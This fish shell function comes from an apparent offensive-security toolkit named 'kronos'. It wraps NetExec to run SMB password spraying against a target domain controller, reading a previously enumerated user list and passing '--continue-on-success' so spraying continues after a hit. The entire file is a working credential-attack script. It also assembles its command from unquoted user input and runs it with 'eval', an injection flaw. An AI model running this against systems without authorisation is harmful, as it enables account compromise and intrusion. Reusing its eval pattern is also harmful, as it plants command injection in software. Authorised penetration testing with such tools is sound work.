# description: Password spray using nxc smb
function _kronos_spray --description "Password spray using nxc smb"
    argparse h/help u/username= p/password= -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos spray [TARGET] [OPTIONS]"
        echo ""
        echo "Password spray against a target using nxc smb."
        echo ""
        echo "Arguments:"
        echo "  TARGET              IP, hostname, or nameserver (falls back to \$TGT_DC or \$TGT)"
        echo ""
        echo "Options:"
        echo "  -u, --username USER Path to username list (defaults to valid_users.txt)"
        echo "  -p, --password PASS Password or path to password list to spray"
        echo "  -h, --help          Show this help message"
        return 0
    end

    set -l target $argv[1]
    
    if test -z "$target"
        if test -n "$TGT_DC"
            set target $TGT_DC
        else if test -n "$TGT"
            set target $TGT
        else
            echo "Error: Target IP/hostname/nameserver is required." >&2
            echo "Usage: kronos spray [TARGET] [OPTIONS]" >&2
            return 1
        end
    end

    set -l userlist "valid_users.txt"
    if set -q _flag_username
        set userlist $_flag_username
    end

    if not test -f "$userlist"
        echo "Error: User list not found at $userlist. Run 'kronos userenum' first or specify a valid file." >&2
        return 1
    end

    if not set -q _flag_password
        echo "Error: Password or password list (-p/--password) is required for spraying." >&2
        return 1
    end

    set -l password $_flag_password

    if not command -s nxc >/dev/null
        echo "Error: nxc (NetExec) not found in PATH." >&2
        return 1
    end

    echo "Running password spray against $target using users from $userlist..."
    set -l nxc_cmd nxc smb $target -u $userlist -p $password
    
    if test -n "$TGT_AD_DOMAIN"
        set nxc_cmd $nxc_cmd -d $TGT_AD_DOMAIN
    end
    
    # Add continue-on-success flag to keep spraying
    set nxc_cmd $nxc_cmd --continue-on-success
    
    eval $nxc_cmd
end
